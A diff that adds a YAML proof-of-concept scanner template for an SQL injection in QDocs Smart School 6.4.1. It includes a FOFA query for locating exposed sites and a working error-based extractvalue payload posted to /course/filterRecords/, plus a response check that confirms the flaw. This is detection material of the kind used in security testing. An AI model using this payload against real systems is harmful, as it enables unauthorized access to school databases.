@@ -1,0 +1,21 @@
+id: poc-yaml-smart-school-filterRecords-sqli
+info:
+  name: QDocs Smart School 6.4.1 filterRecords SQL注入
+  severity: high
+  tags:
+  - sql-injection
+  finger: smart_school
+  fofa: body="close closebtnmodal"
+variables:
+  t1: random_int(100,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /course/filterRecords/
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: searchdata[0][title]=&searchdata[0][searchfield]=1&searchdata[0][searchvalue]=1&searchdata[1][title]=1&searchdata[1][searchfield]=1=1
+    and extractvalue(1,concat(0x5e,(select md5({{.t1}})),0x5e))%23&searchdata[1][searchvalue]=1
+  expression: status_code == 500 && contains(body,substr(t2,0,31)) && contains(body,"error")
+    && contains(body,"mysqli_sql_exception")
+transport: http
